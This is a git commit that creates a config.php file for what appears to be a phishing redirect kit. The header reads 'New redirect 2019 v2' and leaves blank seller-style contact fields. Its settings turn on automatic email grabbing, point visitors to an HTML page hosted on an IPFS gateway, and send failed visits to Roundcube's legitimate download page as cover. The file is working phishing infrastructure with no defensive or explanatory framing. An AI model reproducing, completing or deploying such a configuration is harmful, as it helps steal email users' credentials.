012aec267309f9dc2ab1256a77904770384cb0c6
uscmailmahmod <uscmail.mahmod@gmail.com>
2024-10-10 17:28:31 +0200

    Create config.php

---
+++ config.php
@@ -0,0 +1,16 @@
+<?php
+/* 
+
+New redirect 2019 v2 
+
+Email: 
+
+Facebook: 
+
+ICQ: 
+*/
+$autoEmail="true";//"true":Auto email grabing/ "false":without auto email grabing
+$pagelink="https://cloudflare-ipfs.com/ipfs/bafybeifxfhjukqk4hupvdmzhafmldcxcu4ztmdmflhli4nw6e6ralspst4/zuuu-Portu%20-%20Copy.html";
+$FailRedirect="https://roundcube.net/download/";
+$redirecttype="1";// 1:header - 2:script
+?>
